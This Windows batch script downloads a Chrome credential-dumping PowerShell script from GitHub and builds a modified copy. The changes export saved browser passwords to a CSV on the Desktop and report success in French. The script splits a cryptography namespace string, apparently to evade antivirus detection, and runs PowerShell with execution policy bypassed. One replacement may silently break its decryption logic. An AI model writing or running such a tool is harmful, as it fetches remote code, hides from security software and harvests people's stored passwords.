@echo off
set "WORK_DIR=%TEMP%\chrome_creds_tmp"
if not exist "%WORK_DIR%" mkdir "%WORK_DIR%"
set "PS_OUT=%WORK_DIR%\run_chrome.ps1"

if exist "%WORK_DIR%\payload_temp.txt" del "%WORK_DIR%\payload_temp.txt"
curl.exe -fL -s "https://raw.githubusercontent.com/marcosimioni/chrome-creds/master/chrome-creds.ps1" -o "%WORK_DIR%\payload_temp.txt" 2>nul

> "%WORK_DIR%\make_chrome.ps1" echo $ErrorActionPreference = 'SilentlyContinue'
>> "%WORK_DIR%\make_chrome.ps1" echo $c = Get-Content "%WORK_DIR%\payload_temp.txt" -Raw
>> "%WORK_DIR%\make_chrome.ps1" echo $c = $c -replace '(?s)"Export".*?"Import"', '"Export" { } "Import"'
>> "%WORK_DIR%\make_chrome.ps1" echo $c = $c -replace '\$arrExp \^| Format-Table', ('$arrExp ^| Export-Csv -Path "' + $HOME + '\Desktop\Chrome_Local_Passwords.csv" -NoTypeInformation; Write-Host "`n[SUCCES] Mots de passe exportes sur le Bureau sous Chrome_Local_Passwords.csv !" -ForegroundColor Green')
>> "%WORK_DIR%\make_chrome.ps1" echo $c = $c -replace '#requires -version 7', ''
>> "%WORK_DIR%\make_chrome.ps1" echo $c = $c -replace '\[System\.Convert\]::FromHexString\([^)]*\)', '$null'
>> "%WORK_DIR%\make_chrome.ps1" echo $c = $c -replace 'System\.Security\.Cryptography', 'System.Security.Crypto''graphy'
>> "%WORK_DIR%\make_chrome.ps1" echo Set-Content "%PS_OUT%" -Value $c

powershell -NoProfile -ExecutionPolicy Bypass -File "%WORK_DIR%\make_chrome.ps1" > make_chrome.log 2>&1
echo DONE
